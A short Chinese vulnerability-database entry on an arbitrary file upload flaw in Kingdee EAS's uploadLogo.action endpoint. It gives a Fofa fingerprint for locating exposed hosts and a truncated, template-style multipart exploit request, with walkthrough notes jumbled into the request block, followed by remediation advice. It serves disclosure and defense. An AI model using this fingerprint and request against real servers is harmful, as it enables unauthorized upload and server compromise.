# 金蝶EASuploadlogo存在任意文件上传

- **系统**：金蝶　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="Kingdee-EAS"`
- **请求**：`POST /plt_portal/setting/uploadLogo.action HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app="Kingdee-EAS"
1. 部分界面如下
3、隐患url,复现如下
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycxkT8bV6WLIUzm2p
------WebKitFormBoundarycxkT8bV6WLIUzm2p
Content-Disposition: form-data; name="chooseLanguage_top"
ch
------WebKitFormBoundarycxkT8bV6WLIUzm2p
Content-Disposition: form-data; name="dataCenter"
xx
------WebKitFormBoundarycxkT8bV6WLIUzm2p
Content-Disposition: form-data; name="insId"  fragment-1641287796427
------WebKitFormBoundarycxkT8bV6WLIUzm2p
Content-Disposition: form-data; name="type"
top
------WebKitFormBoundarycxkT8bV6WLIUzm2p
Content-Dispo…（脚本共 2048 字，完整版见原文）
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。